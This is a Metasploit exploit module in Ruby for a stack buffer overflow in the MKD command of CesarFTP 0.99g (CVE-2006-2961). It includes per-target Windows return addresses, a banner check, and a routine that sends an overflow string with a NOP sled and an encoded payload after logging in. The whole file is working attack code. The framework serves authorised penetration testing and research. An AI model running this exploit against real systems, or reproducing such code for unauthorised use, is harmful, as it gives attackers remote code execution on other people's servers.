##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cesar FTP 0.99g MKD Command Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.

        You must have valid credentials to trigger this vulnerability. Also, you
        only get one chance, so choose your target carefully.
      },
      'Author'         => 'MC',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2006-2961'],
          [ 'OSVDB', '26364'],
          [ 'BID', '18586'],
          [ 'URL', 'http://web.archive.org/web/20060619195555/http://secunia.com:80/advisories/20574/' ],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 250,
          'BadChars' => "\x00\x20\x0a\x0d",
          'StackAdjustment' => -3500,
          'Compat'        =>
            {
              'SymbolLookup' => 'ws2ord',
            }
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e14c29 } ],
          [ 'Windows 2000 Pro SP4 French',  { 'Ret' => 0x775F29D0 } ],
          [ 'Windows XP SP2/SP3 English',       { 'Ret' => 0x774699bf } ], # jmp esp, user32.dll
          #[ 'Windows XP SP2 English',       { 'Ret' => 0x76b43ae0 } ], # jmp esp, winmm.dll
          #[ 'Windows XP SP3 English',       { 'Ret' => 0x76b43adc } ], # jmp esp, winmm.dll
          [ 'Windows 2003 SP1 English',     { 'Ret' => 0x76AA679b } ],
        ],
      'DisclosureDate' => '2006-06-12',
      'DefaultTarget'  => 0))
  end

  def check
    connect
    disconnect

    if (banner =~ /CesarFTP 0\.99g/)
      return Exploit::CheckCode::Appears
    end
      return Exploit::CheckCode::Safe
  end

  def exploit
    c = connect_login
    return if not c

    sploit =  "\n" * 671 + rand_text_english(3, payload_badchars)
    sploit << [target.ret].pack('V') + make_nops(40) + payload.encoded

    print_status("Trying target #{target.name}...")

    send_cmd( ['MKD', sploit] , false)

    handler
    disconnect
  end
end
